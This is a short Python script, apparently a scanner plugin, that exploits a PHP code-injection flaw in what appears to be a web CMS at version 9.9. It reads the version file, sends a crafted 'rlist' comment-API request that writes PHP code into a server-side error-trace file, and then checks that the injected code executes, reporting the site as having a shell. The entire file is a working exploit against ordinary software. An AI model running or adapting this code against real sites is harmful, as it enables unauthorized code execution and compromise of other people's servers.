import requests


class Exploit:

    versionUrl = "/data/admin/ver.txt"
    shellUrl = "/data/mysqli_error_trace.php"
    apiUrl = "/comment/api/index.php?type=0&gid=1&page=2&ran=0.8305741834647316&rlist['1']="


    def attack(self, url):
        versionurl = url + self.versionUrl
        shellUrl = url + self.shellUrl
        attackUrl = url + self.apiUrl
        response = requests.get(shellUrl)
        version = requests.get(versionurl).text
        if response.status_code == 200 and "9.9" in version:
            requests.get(attackUrl + "11)*/phpinfo();/*")
            response2 = requests.get(shellUrl)
            if "phpinfo()" in response2.text:
                return "{} has shell!".format(shellUrl)




